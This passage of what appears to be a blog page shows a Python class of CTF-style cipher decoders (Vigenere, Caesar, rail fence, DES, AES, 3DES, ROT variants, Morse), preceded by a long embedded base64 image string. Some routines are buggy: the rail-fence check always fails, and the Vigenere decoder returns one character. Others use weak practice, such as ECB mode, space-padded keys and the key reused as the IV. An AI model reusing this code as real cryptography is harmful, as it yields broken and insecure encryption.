3y9m12z/AKl89O1d78dvCF/8Q/gp4/8ACeltCmpa94f1DSrVrhisayz20kSFiAcKC4ycHivzq/4IdqVb40HsRovU/wDX9/8AWr9SZiMrnFAH4kn/AII4fHjtfeD8f9hOb/4xX6jfsV/CDXv2f/2aPB/gHxK9lLrekNeC5ewmMkJ828mnXaxVSfllXsOa9yhGUGRTvLUHOKAHU1/umomnKsg45OD6/h/npmnyNhewoA/lhn/10n+8a/Q//gnR+3x8Nf2VvgvrvhXxlba9Nqd74gm1OJtLs45o/Ka2t4wCWlU7t0T8Y6Y5r88rlcSMe5Y1FQB+qH7Zf/BSz4S/H79mrxn4D8NWviWHWtXW1Fu9/YRxwgx3UMzbmWViPljbt1xX5XkYJA5pQxAxSUAKgDMAentX21/wTY/bA8C/skXPxBm8aw6xOmvLYJa/2VapMQYTcF9251x/rVx1718SdKXccYzxQB+0fjD/AIKcfCL49+Edb+Gfhq08Sx+IfGdjP4c017+xijt1ubuNreIyMJmKoHkXcwU4GTg9K+Q/+HOHx4PS+8H/APgzn/8AjFfMX7MjEftI/Cj38WaT/wClkVf0shQAABwKAPA/2Ivgz4h/Z5/Zu8NeA/E72UutaZNdtO+nzGSH97cySrhiqk/K47da5n/goR+zp4q/ak+Bth4R8HS6dDqsOt2+ou2pztDEI0hnQjKqx3ZkXjHrX02zYdsEemMdKRXwy9OT0HegD8S/+HOPx3H3r/weB/2E5v8A4xXw9e2jWN3NbuQXidkJHQkEjj8q/qblwq54HNfy3+IxjW9QzwftMnT/AHjQB71+zV+wf8SP2qvCOp+I/BlxoUOn6ffHT5hqt3JDIZRGknAWNgRiRec9c19ffshf8Ey/i78Cv2jvBXjnxHd+GZdG0ieaS4Sx1CSSYq8EkY2q0Sg8uO9emf8ABE8A/s9eNv8AsaX/APSS3r9DTGCaAFUkoDjnHSvjn4j/APBVL4OfC7x54h8IazY+KG1bQ72WwujbafE8RkjYqxVjMCRkdSBX2PjAx2r+cX9tA5/a0+Lq9v8AhJ7/AP8ARrUAfdn7RmrRf8FYLTQ9J+C4ayu/BMk1zqf/AAlQ+xqyXIVYvLMfm7jmB85x2xnPHnPws/4JK/GzwX8TfCPiHUL3wm1jpOsWd/OsOozM5jimR2CgwDJwpwM113/BEIbfFXxZGMj7Fp3J7/PcV+sE2BjjFAEiNuGadUcH+r6Y5qSgAooooAKKKKACv5Wq/qlr+VqgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD1T9k/8A5Om+Df8A2Oejf+l0Nf0o1/Nd+yf/AMnTfBv/ALHPRv8A0uhr+lGgAooooAKKKKACq2pf8g+5/wCuTfyNWahvITcW7xgkbgRkfSgD+WFup+tXLLXNR02IxWmoXVrETuKQTMik+uAevAr9gh/wRQ+GDcHxz4uGO/8AovP/AJCpf+HJvwv/AOh78Xfna/8AxqgD8hP+Es1v/oM6h/4FP/jR/wAJZrf/AEGdQ/8AAp/8a/Xv/hyb8L/+h78Xfna//GqP+HJvwv8A+h78Xfna/wDxqgD8hP8AhLNb/wCgzqH/AIFP/jR/wlmt/wDQZ1D/AMCn/wAa/Xv/AIcm/C//AKHvxd+dr/8AGqP+HJvwv/6Hvxd+dr/8aoA/IT/hLNb/AOgzqH/gU/8AjR/wlmt/9BnUP/Ap/wDGv17/AOHJvwv/AOh78Xfna/8Axqj/AIcm/C//AKHvxd+dr/8AGqAPx1u724v52mubiW4mbG6SVyzHAwMk+wAr74/4Irf8nS+Kf+xNuv8A0usa+kv+HJvwv/6Hvxd+dr/8ar2T9lT/AIJ5eD/2TfiLfeMPD3iPXdZvb3TJNKkg1TyfLWN5YpSw2Ip3AwqOuME0AfV7/dNfyut94/Wv6oZgSo29c1+df/DlD4YNwfHXi4Ad/wDRef8AyFQB+P1lreo6bEYrO/urWMtuKQTMgJ9cA9eB+VWDrOt6xGbRtQvryOTAMLzu6tyCMgnHUA/hX633n/BF74W2jIi+OPF08znCxA2oz7k+VwK7/wAGf8Epfhl4NgX7Presy3HeWTySfz8ugD8b9K+EXijWEDxac6A/89QR/Sv6A/2bNA0jS/2dPhZa6jott9st/CulRTyPZq2XW0iDHcRzyDzXno/4J8eDlHHiPW+P+uP/AMRX0j4U0GLwn4W0bQ7eSSe30yzhsopZcb3WNAgLY7kKM0AfmL/wWjuo9FT4OSeH3GmpL/bAmOn/ALnfj7Dt3bcZxlsZ9TXw1+yr4m1i4/ag+D8UurX0sUnjHR1dHuXKspvYQQRnkEV+437SP7JvhP8AagtdIg8TT3doumCcRNZhNzeb5e7O5T08sYx6mvnXwD/wSe+HXw0+KnhrxVbeK/EhutE1S11WzhkaAwSyQSrKqN+7zglQDz0J5oA/QEHsKdUcYIHNSUAfA3/BZm/utM/Zg8MS2dzNaynxhaqXgcoxH2K94yO3Ar8aP+Es1wf8xnUP/Ap/8a/ok/aq/Ze0P9rL4e6d4P8AEOq6lo1jZ6pHqiz6YI/MaRIpowp3qw24mY9M5Ar5UP8AwRP+F4BJ8d+LQB72v/xqgD8cixIwSSPetDSvDupa3JssrOW4P+wucV+uuk/8Ea/hd/aW9PF/ii8tYz8xnNuFY+gAiGa9e0b/AIJs/D7QLZYLHWtYgRRj5RCCf/HKAPxbtvgX4tuow62KqPRiQf5Vl6x8LPEuiKWuNOkZR1MYJA/Sv3J/4d8+Dv8AoZNb/OH/AOIprf8ABPbwa6lW8R62VPUHyf8A4igD8DpInhcq6lGHYjFNr9tfG/8AwSU+GPi5TMdc1u3uRzvgMCk/+Q65Cy/4It/Cy9j3L468Xo4OGjY2uVPp/qqAPzD/AGZP+TkvhR/2Nuk/+lkVf0t18DeAf+CP/wAOfh5468O+KbHxn4ourzRNRttThhnNt5bvDKsiq2IgcEqAcEcE197oCBzQB+EP/BUnxBqmn/ts+OYLXUru2gWDTiI4Z2VRmxgJwAcdSa7n/gjprmo6l+1XqsV5qF1dRjwteMEnmZwD9otecE9eTX23+0T/AMExvA37R/xd1nx/rfijxFpmo6msEclrYeR5KiKFIlxvjY8hATz1rW/Zb/4J1eDf2U/iTP4z8P8AiTXtYvp9Pk01oNT8ny1R3jcsNiKcgxKOuME0AfWxAPXmsn/hEtDzn+xtPz/16p/hWtRQBWsdNtNMjaOztYbSNjuKwRhAT64AqzRRQAV/OH+2lx+1r8Xv+xnvv/RzV/R2ehr4T+KX/BJL4e/Fn4keJfGWo+MPE9lfa9fzahPb2v2fyo3kYsVXdETgE8ZOaAPxRsdWvtM3/Y724tN+N3kSsm7HTODXo3wD8UazN8dfhzHJq188b+JNNVla5cgg3UeQRmv1A/4cm/C//oe/F352v/xqtjwb/wAEdvhx4G8YaF4is/Gnim4utIv4L+KKY22x3ikV1DYizglQD7UAffgAHSlpsYIXmnUAFFFFABRRRQAV/K1X9UtfytUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAeqfsn/8AJ03wb/7HPRv/AEuhr+lGv5rv2T/+Tpvg3/2Oejf+l0Nf0o0AFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAVFczLbwvIxwqjNS1keJJMWcUXaeVYj+IJ/pQBDp4Lb7uUfvp/m5/hXsKuebVVpeTg8VyfjTx7F4ehNvbETag4+Veye5p7gaXi7x3aeFkjjOJryVgEhB5wT1PoK6Tza+bpzPe3X2y5czzlw5LHrznFd0/xmuFOBo2f+3j/AOxqnFk3PV/NqG8hS9gaJh15B9D2NeVP8a7hBk6L/wCTH/2Nenxz70VumQDUtNDvcu6ReNdW2JOJozsf3I4z+NaFYWmy7NbmiHSWISn8CFrdpDCsrWbhtqWkZxJOcE/3V7n9MVq1z8s3m63d5/5YIsY/4EA1AFyEJbxLGgwijAFP82snWdVOlaTeXgTzTbxNLszjdgZxmvO1+NVwwyNFH/gR/wDY00mxXseo6lfmx066uQoYwxPIF9cAnH6Vm+FPGNn4r09Z7dgsoH7yEn5kP+Fee3Xxbn1GzuLZtI8sTRtHu8/OMjGfu1x2l3V3oFzHd2UhjlXqOzD0NUosVz6O82qV032O6jvYx0wkoHdT3/CsLwn4ztvE1oCD5V2g/eQk8g+3qK3pcTxSRnkOpX8xUFG3GwdQwOQRkGnVn6BcG60qCQ+hX8iR/StCgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACv5Wq/qlr+VqgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD1T9k//AJOm+Df/AGOejf8ApdDX9KNfzXfsn/8AJ03wb/7HPRv/AEuhr+lGgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACsLxYdlvZSH7sd0jn6YP+NbtZ+vWH9paZPB3ZePrQBkTnh0yVyCMjqK8h8S+FLjQ9QkuZHa6t5mLCc8nPo1eoWd219ZrI/E6HZKvow60k6x3ETxTossTjDI3Q1SdmJq54/hdvtUZ8rPJFb3iXw1LocyXFvmaxaQc9SnPQ16NmL/nhB/35X/CtHJIhRPEr3yvKOCK95gl/dRj/ZFU/wBy3HkQH/tin+FTJIsaNI52xoMk+1ZydykrFvSzv8SsR/yztdh+pYGulrnfCMDyxz6hKpVrpsqD/cHC/piuiqSgrlpDs17U1PVxG4+gUCuprlvE6Gw1C21EA+UR5MxHZSeD+eKAMzxTLnw3qgP/AD7Sf+gmvG7byvKXJHSvcJhgnIDqexGQRUP7of8ALCD/AL8p/hVxlYlq542vlZ4IqRgu2vVtWeNdKvSIYQRC/IiUH7p9q4vwl4Ua/jivdQUrbdUiPBk+vtVqSJ5SPwX4SubvUI9TMj2lvGflZeGk9vpXqSThQznooLH8KoowChUAVRwFUYAqPUZH8hLSLm4uj5YA/u/xH8s1k3ctKx0PhNSmhW4PUlz+bk/1rXqCxtxaWsUK9EULU9IYUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABX8rVf1S1/K1QAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB6p+yf/ydN8G/+xz0b/0uhr+lGv5rv2T/APk6b4N/9jno3/pdDX9KNABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFNbrTqa3WgDkvEGlXGl3j6pYIZY3/4+bcfxD+8PcVWtrq31SLzbaQOO6nhlPoRXakZrn9X8GWmoTfaYHexu/wDnrAdufqO/40AZTwnaVZQyngqRwaQRsT0p7aH4ktjtjubK9UdDOpQ/+Oij+yfE0pxjTrYf3kLMf1oAXYsCGSZ1jQclmOBVazgk8WziOINFpEZBeQjBnPoPatG08DCaZZ9Wu31CQHIjPyxj/gI4NdRFEkKBI1CIOAFGBQAsUaxIqKMKowBUlNHWnUAFVr2zjv7WW3mXdHIu0irNMoA4J5JfDc4sdQJNoeLe7xkAf3W/xq20O4BkIZT0IORXW3VpDewtFPGssbDBVhkVy83giaycvpGoPaqefIkG+P8AAHOPwoAqtETkFQVPBB6GnrEzYGOOmB2o/szxPHx5Wmzf7TMyn9KVPD/iG8+We9trGM9fsybj+bCgCK8v7fSUHmnfM3CQpyzH6VqeGtFn89tT1AAXci4SIdIl9KtaL4TstHYygNcXLfenmO5j+JraoActLSLS0AFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAV/K1X9UtfytUAFFFFABRRRQAUUUUAFFFFAH/9k=+lpvEwP01XUGshAokgX+8z+7PKRTF6SoN7e/KMCnSlw68wemkMF3oSSEHSnAKHsLiQ0iFCSge4UIJTdhYQGEUoy0J0ChLK7kNAgQkkGulOAUHYXEhpEKMlAdwpcG8rhcRv/HkN3stIgW4F88DYoX89nObjmANuOc0eMXpHHcyX9+mowhgHKmdlChM0BZzvzet6DSSW7xjEWk8Hu+/O1x7zF1237/Uu4t/O46V6sZuARoZb9KqbO7On4rJlykqcYYnNAjSbx3Gmrj6WTzxirVlA+90F82G+nm4fX3zOxgqyKqRaUU7b8FpRDOeyjJa7k5oByT1yWse4mxfDC3NrrprnQtQeUMuUXoURmCGHdKfl/oTS8MElxu2mudO0BXUCZL8efVGU0EmsQjkGpM2H8y/CwGtW1C3el8ywxhHKWxgOlaPNj0VcRRW+OoiKvCXF0o6YeXWLQDaNQyMf1Clhsi22D9HUNXOBCVZamaBmiO5BxRdRQOt3M3oFUAD4/HDolSChx7AvXzRIJQtgsUfMu6HB+HglNLc5d5KiwpcAqTH7Idk/lvLD9Z0rUx4vYWL2UJ4WY6XbdL91ML57+EjsRNEMnw/LCrKklN9NNkbuLvKsdabjM/ZMByh+PDWuuw6kDEYXPzeSfzGARlNG1M1ENRCfGLlUuJ5MVTg+UyxGzC+1+KN/DkDyuTSVbqo7vNnagfKPTrH9b8pQtgQ/PRCifDTaUJaIWw8adUycklLrcppkyCZfkJ5cYlSZnQTkmsYf58OYAlMpg6JnlhYlC9uxhIdWvbr1NS8Ahc9pgQlkkai3fOorVUK4JGeYTJIgVTm+mnCqrmSfOgDJ0mOlOlhcmClk3M0KmPzeF0mnDGVB6LjqbmKB8p5GRQ34DStRCdpEpp5MRNWRNocwsjk9i7nyqugzPYTWUSZuqe0qVucAT5tgH9ITmxEdCdihjpcCVAgfI8uJ4pgx3K3UhgBeRQ9dtbJmjp1TnYmsKoSH1UGqKE23mxlrsri4yKsuAFnZ5BrAugypw0/IdSvHmxHJbEI6lREzj0asuOc7TR8BONdd9pNKCo4LRNY9CdgCEXjqObDhQvsFpy7z7DsqHP9khxp9DzNeKbSR+Iy3/n31tqVFYe17xFUZkTu507+4px4USFwBRm32lbzFyXphgRMtn3cwqqaef8a0UrMHlaJYM8RC1Iq2DeOXvKUdVjALmzromST8+4N+Egm9rrwzl/DpAVlddnE9su36Jyx6ECtkUxufaUMJOzfwQsxldUbnTLyO/ckCcNsS112yDmkkGF/4xKL8rHndrowChbKMrV61QgFBWiMepbRQglG105aoVChDKCvE4tY0ChLKNrly1QgFCWSEep7ZRgFC20ZWrVihAKCvE49Q2ChDKNrpy1QoF/gDXIhmWmc+CSAAAAABJRU5ErkJggg==&quot;</span><br><span class="line">            imgdata = base64.b64decode(content)</span><br><span class="line">            file = open(&#x27;1.jpg&#x27;, &#x27;wb&#x27;)</span><br><span class="line">            file.write(imgdata)</span><br><span class="line">            file.close()</span><br><span class="line">            return False</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base64转为image-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def VigenereDecrypto(self, output, key):</span><br><span class="line">        # 请输入需要解密的字符：NIMCIGTURIBNMUMRZMABUK</span><br><span class="line">        # 请输入Key:beijingmeetatnineinthe</span><br><span class="line">        # 解密后的字符： meetatnineintheevening</span><br><span class="line">        try:</span><br><span class="line">            # 实现列表元素对应相减（解密部分）</span><br><span class="line">            def sub_list(x, y):</span><br><span class="line">                result = []</span><br><span class="line">                for i in range(len(x)):</span><br><span class="line">                    z = x[i] - y[i]</span><br><span class="line">                    result.append(z)</span><br><span class="line">                return result</span><br><span class="line"></span><br><span class="line">            # 构造映射 字符----&gt;num</span><br><span class="line">            def c2n():</span><br><span class="line">                list_c = []</span><br><span class="line">                list_n = []</span><br><span class="line">                for i in range(26):</span><br><span class="line">                    list_n.append(i)</span><br><span class="line">                    list_c.append(chr(i + 97))</span><br><span class="line">                dic_c2n = dict(map(lambda x, y: [x, y], list_c, list_n))</span><br><span class="line">                return dic_c2n</span><br><span class="line"></span><br><span class="line">            # 构造映射 num----&gt;字符</span><br><span class="line">            def n2c():</span><br><span class="line">                list_c = []</span><br><span class="line">                list_n = []</span><br><span class="line">                for i in range(26):</span><br><span class="line">                    list_n.append(i)</span><br><span class="line">                    list_c.append(chr(i + 97))</span><br><span class="line">                dic_n2c = dict(map(lambda x, y: [x, y], list_n, list_c))</span><br><span class="line">                return dic_n2c</span><br><span class="line"></span><br><span class="line">            # 解密</span><br><span class="line">            def decode(s, key):</span><br><span class="line">                print(&#x27;解密后的字符： &#x27;, end=&#x27;&#x27;)</span><br><span class="line">                dic_c2n = c2n()</span><br><span class="line">                dic_n2c = n2c()</span><br><span class="line">                list_s = []</span><br><span class="line">                list_key = []</span><br><span class="line">                list_finall = []</span><br><span class="line">                for i in s:</span><br><span class="line">                    i = i.lower()</span><br><span class="line">                    list_s.append(dic_c2n[i])</span><br><span class="line">                for i in key:</span><br><span class="line">                    i = i.lower()</span><br><span class="line">                    list_key.append(dic_c2n[i])</span><br><span class="line">                for i in list_key:</span><br><span class="line">                    if len(list_key) &lt; len(list_s):</span><br><span class="line">                        list_key.append(i)</span><br><span class="line">                list_result = sub_list(list_s, list_key)</span><br><span class="line">                for i in list_result:</span><br><span class="line">                    if i &lt; 0:</span><br><span class="line">                        i += 26</span><br><span class="line">                    list_finall.append(dic_n2c[i])</span><br><span class="line">                for i in list_finall:</span><br><span class="line">                    print(i, end=&#x27;&#x27;)</span><br><span class="line">                return i</span><br><span class="line"></span><br><span class="line">            a = decode(output, key)</span><br><span class="line">            print(a)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;维吉尼亚密码-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def caesar_Crypto(self, content):</span><br><span class="line">        try:</span><br><span class="line">            lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">            uppercase = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">            result = []</span><br><span class="line">            offset = 1</span><br><span class="line">            while offset &lt;= 26:</span><br><span class="line">                temp = []</span><br><span class="line">                for char in content:</span><br><span class="line">                    if char in lowercase:</span><br><span class="line">                        temp.append(chr(97 + (ord(char) - 97 + offset) % 26))</span><br><span class="line">                    elif char in uppercase:</span><br><span class="line">                        temp.append(chr(65 + (ord(char) - 65 + offset) % 26))</span><br><span class="line">                    else:</span><br><span class="line">                        temp.append(char)</span><br><span class="line">                string = &quot;&quot;.join(temp)</span><br><span class="line">                #print(string)</span><br><span class="line">                result.append(string)</span><br><span class="line">                offset += 1</span><br><span class="line">            print(result)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;凯撒密码-------------------------------解密失败&#x27;)</span><br><span class="line"></span><br><span class="line">    def railfence(self, string):</span><br><span class="line">        try:</span><br><span class="line">            if string &lt; 50:</span><br><span class="line">                def generate_w(string, n):</span><br><span class="line">                    &#x27;&#x27;&#x27;将字符排列成w型&#x27;&#x27;&#x27;</span><br><span class="line">                    array = [[&#x27;.&#x27;] * len(string) for i in range(n)]  # 生成初始矩阵</span><br><span class="line">                    row = 0</span><br><span class="line">                    upflag = False</span><br><span class="line">                    for col in range(len(string)):  # 在矩阵上按w型画出string</span><br><span class="line">                        array[row][col] = string[col]</span><br><span class="line">                        if row == n - 1:</span><br><span class="line">                            upflag = True</span><br><span class="line">                        if row == 0:</span><br><span class="line">                            upflag = False</span><br><span class="line">                        if upflag:</span><br><span class="line">                            row -= 1</span><br><span class="line">                        else:</span><br><span class="line">                            row += 1</span><br><span class="line">                    return array</span><br><span class="line"></span><br><span class="line">                def decode(string, n):</span><br><span class="line">                    &#x27;&#x27;&#x27;解密&#x27;&#x27;&#x27;</span><br><span class="line">                    array = generate_w(string, n)</span><br><span class="line">                    sub = 0</span><br><span class="line">                    for row in range(n):  # 将w型字符按行的顺序依次替换为string</span><br><span class="line">                        for col in range(len(string)):</span><br><span class="line">                            if array[row][col] != &#x27;.&#x27;:</span><br><span class="line">                                array[row][col] = string[sub]</span><br><span class="line">                                sub += 1</span><br><span class="line">                    msg = []</span><br><span class="line">                    for col in range(len(string)):  # 以列的顺序依次连接各字符</span><br><span class="line">                        for row in range(n):</span><br><span class="line">                            if array[row][col] != &#x27;.&#x27;:</span><br><span class="line">                                msg.append(array[row][col])</span><br><span class="line">                    return array, msg</span><br><span class="line"></span><br><span class="line">                for n in range(2, len(string)):  # 遍历所有可能的栏数</span><br><span class="line">                    print(str(n) + &#x27;栏：&#x27; + &#x27;&#x27;.join(decode(string, n)[1]))</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;栅栏密码-------------------------------解密失败&#x27;)</span><br><span class="line"></span><br><span class="line">    def des_descrypt(self, content, key):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        DES 解密</span><br><span class="line">        Python 语言采用 pyDes 作为 DES 加解密处理的包。DES 解密时采用 CBC 模式，并采用 PAD_PKCS5 作为填充模式，使用解密密钥作为初始化向量。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            iv = key</span><br><span class="line">            k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5)</span><br><span class="line">            de = k.decrypt(binascii.a2b_hex(content), padmode=PAD_PKCS5)</span><br><span class="line">            print(de)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;DES 解密-------------------------------解密失败&#x27;)</span><br><span class="line"></span><br><span class="line">    def aes_encode(self, content, key):</span><br><span class="line">        try:</span><br><span class="line">            def auto_fill(x):</span><br><span class="line">                if len(x) &lt;= 32:</span><br><span class="line">                    while len(x) not in [16, 24, 32]:</span><br><span class="line">                        x += &quot; &quot;</span><br><span class="line">                    return x.encode()</span><br><span class="line">                else:</span><br><span class="line">                    raise Exception(&quot;密钥长度不能大于32位！&quot;)</span><br><span class="line"></span><br><span class="line">            x = Crypto.Cipher.AES.new(auto_fill(key), Crypto.Cipher.AES.MODE_ECB)</span><br><span class="line">            a = base64.encodebytes(x.encrypt(auto_fill(content)))</span><br><span class="line">            b = x.decrypt(base64.decodebytes(a))</span><br><span class="line">            print(a)</span><br><span class="line">            print(b)</span><br><span class="line">            a = binascii.b2a_base64(x.encrypt(auto_fill(content)))</span><br><span class="line">            b = x.decrypt(binascii.a2b_base64(a))</span><br><span class="line">            print(a)</span><br><span class="line">            print(b)</span><br><span class="line">            iv = Crypto.Random.new().read(16)  # 向量，必须为16字节</span><br><span class="line">            y = Crypto.Cipher.AES.new(auto_fill(key), Crypto.Cipher.AES.MODE_CBC, iv)</span><br><span class="line">            c = binascii.b2a_base64(y.encrypt(auto_fill(content)))</span><br><span class="line">            z = Crypto.Cipher.AES.new(auto_fill(key), Crypto.Cipher.AES.MODE_CBC, iv)</span><br><span class="line">            d = z.decrypt(binascii.a2b_base64(c))</span><br><span class="line">            print(c)</span><br><span class="line">            print(d)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;AES解密-------------------------------解密失败&#x27;)</span><br><span class="line"></span><br><span class="line">    def des3_encode(self, content, key):</span><br><span class="line">        try:</span><br><span class="line">            def auto_fill(x):</span><br><span class="line">                if len(x) &gt; 24:</span><br><span class="line">                    raise Exception(&quot;密钥长度不能大于等于24位！&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    while len(x) &lt; 16:</span><br><span class="line">                        x += &quot; &quot;</span><br><span class="line">                    return x.encode()</span><br><span class="line"></span><br><span class="line">            x = Crypto.Cipher.DES3.new(auto_fill(key), Crypto.Cipher.DES3.MODE_ECB)</span><br><span class="line">            a = base64.encodebytes(x.encrypt(auto_fill(content)))</span><br><span class="line">            print(a)</span><br><span class="line">            b = x.decrypt(base64.decodebytes(a))</span><br><span class="line">            print(b)</span><br><span class="line">            a = binascii.b2a_base64(x.encrypt(auto_fill(content)))</span><br><span class="line">            b = x.decrypt(binascii.a2b_base64(a))</span><br><span class="line">            print(a)</span><br><span class="line">            print(b)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;des3-------------------------------解密失败&#x27;)</span><br><span class="line"></span><br><span class="line">    def rot5decoder(self,content):</span><br><span class="line">        try:</span><br><span class="line">            res = &#x27;&#x27;</span><br><span class="line">            dict_rot5 = &#123;&#x27;0&#x27;: &#x27;5&#x27;, &#x27;1&#x27;: &#x27;6&#x27;, &#x27;2&#x27;: &#x27;7&#x27;, &#x27;3&#x27;: &#x27;8&#x27;, &#x27;4&#x27;: &#x27;9&#x27;, &#x27;5&#x27;: &#x27;0&#x27;, &#x27;6&#x27;: &#x27;1&#x27;, &#x27;7&#x27;: &#x27;2&#x27;, &#x27;8&#x27;: &#x27;3&#x27;, &#x27;9&#x27;: &#x27;4&#x27;&#125;</span><br><span class="line">            for i in content:</span><br><span class="line">                value = ord(i)</span><br><span class="line">                if (value &lt;= 57) and (value &gt;= 48):</span><br><span class="line">                    res += dict_rot5[i]</span><br><span class="line">                else:</span><br><span class="line">                    res += i</span><br><span class="line">                    continue</span><br><span class="line">            print(res)</span><br><span class="line">            return res</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;rot5-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def rot13decoder(self, crypt_str, shift=13):</span><br><span class="line">        try:</span><br><span class="line">            crypt_list = list(crypt_str)</span><br><span class="line">            plain_str = &quot;&quot;</span><br><span class="line">            num = int(shift)</span><br><span class="line">            for ch in crypt_list:</span><br><span class="line">                ch = ord(ch)</span><br><span class="line">                if ord(&#x27;a&#x27;) &lt;= ch and ch &lt;= ord(&#x27;z&#x27;):</span><br><span class="line">                    ch = ch + num</span><br><span class="line">                    if ch &gt; ord(&#x27;z&#x27;):</span><br><span class="line">                        ch -= 26</span><br><span class="line">                if ord(&#x27;A&#x27;) &lt;= ch and ch &lt;= ord(&#x27;Z&#x27;):</span><br><span class="line">                    ch = ch + num</span><br><span class="line">                    if ch &gt; ord(&#x27;Z&#x27;):</span><br><span class="line">                        ch -= 26</span><br><span class="line">                a = chr(ch)</span><br><span class="line">                plain_str += a</span><br><span class="line">            print(plain_str)</span><br><span class="line">            return plain_str</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;rot13-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def rot18decoder(self, content):</span><br><span class="line">        try:</span><br><span class="line">            res = &#x27;&#x27;</span><br><span class="line">            dict_rot5 = &#123;&#x27;0&#x27;: &#x27;5&#x27;, &#x27;1&#x27;: &#x27;6&#x27;, &#x27;2&#x27;: &#x27;7&#x27;, &#x27;3&#x27;: &#x27;8&#x27;, &#x27;4&#x27;: &#x27;9&#x27;, &#x27;5&#x27;: &#x27;0&#x27;, &#x27;6&#x27;: &#x27;1&#x27;, &#x27;7&#x27;: &#x27;2&#x27;, &#x27;8&#x27;: &#x27;3&#x27;, &#x27;9&#x27;: &#x27;4&#x27;&#125;</span><br><span class="line">            keys_rot18 = str(string.ascii_lowercase) + str(string.ascii_uppercase)</span><br><span class="line">            values_rot18 = [chr((ord(i) + 13 - 97) % 26 + 97) for i in string.ascii_lowercase] + [</span><br><span class="line">                chr((ord(i) + 13 - 65) % 26 + 65) for i in string.ascii_uppercase]</span><br><span class="line">            dict_rot18 = dict((zip(keys_rot18, values_rot18)), **dict_rot5)</span><br><span class="line">            for index_key in content:</span><br><span class="line">                try:</span><br><span class="line">                    res += dict_rot18[index_key]</span><br><span class="line">                except:</span><br><span class="line">                    res += index_key</span><br><span class="line">                    pass</span><br><span class="line">            print(res)</span><br><span class="line">            return res</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;rot18-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def rot47decoder(self, content):</span><br><span class="line">        try:</span><br><span class="line">            x = []</span><br><span class="line">            for i in range(len(content)):</span><br><span class="line">                j = ord(content[i])  # 字符在ASCII中的序号</span><br><span class="line">                if j &gt;= 33 and j &lt;= 126:  # 用于ROT47编码的字符其ASCII值范围是33－126</span><br><span class="line">                    x.append(chr(33 + ((j + 14) % 94)))</span><br><span class="line">                else:</span><br><span class="line">                    x.append(content[i])</span><br><span class="line">            a = &quot;&quot;.join(x)</span><br><span class="line">            print(a)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;rot13-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    # 将字符串从摩斯解密为英文的函数</span><br><span class="line">    def mosdecrypt(self, content):</span><br><span class="line">        try:</span><br><span class="line">            # 表示摩斯密码图的字典</span><br><span class="line">            MORSE_CODE_DICT = &#123;&#x27;A&#x27;: &#x27;.-&#x27;, &#x27;B&#x27;: &#x27;-...&#x27;,&#x27;C&#x27;: &#x27;-.-.&#x27;, &#x27;D&#x27;: &#x27;-..&#x27;, &#x27;E&#x27;: &#x27;.&#x27;,&#x27;F&#x27;: &#x27;..-.&#x27;, &#x27;G&#x27;: &#x27;--.&#x27;, &#x27;H&#x27;: &#x27;....&#x27;,&#x27;I&#x27;: &#x27;..&#x27;, &#x27;J&#x27;: &#x27;.---&#x27;, &#x27;K&#x27;: &#x27;-.-&#x27;,</span><br><span class="line">                               &#x27;L&#x27;: &#x27;.-..&#x27;, &#x27;M&#x27;: &#x27;--&#x27;, &#x27;N&#x27;: &#x27;-.&#x27;,&#x27;O&#x27;: &#x27;---&#x27;, &#x27;P&#x27;: &#x27;.--.&#x27;, &#x27;Q&#x27;: &#x27;--.-&#x27;,&#x27;R&#x27;: &#x27;.-.&#x27;, &#x27;S&#x27;: &#x27;...&#x27;, &#x27;T&#x27;: &#x27;-&#x27;,&#x27;U&#x27;: &#x27;..-&#x27;, &#x27;V&#x27;: &#x27;...-&#x27;, &#x27;W&#x27;: &#x27;.--&#x27;,</span><br><span class="line">                               &#x27;X&#x27;: &#x27;-..-&#x27;, &#x27;Y&#x27;: &#x27;-.--&#x27;, &#x27;Z&#x27;: &#x27;--..&#x27;,&#x27;1&#x27;: &#x27;.----&#x27;, &#x27;2&#x27;: &#x27;..---&#x27;, &#x27;3&#x27;: &#x27;...--&#x27;,&#x27;4&#x27;: &#x27;....-&#x27;, &#x27;5&#x27;: &#x27;.....&#x27;, &#x27;6&#x27;: &#x27;-....&#x27;,&#x27;7&#x27;: &#x27;--...&#x27;, 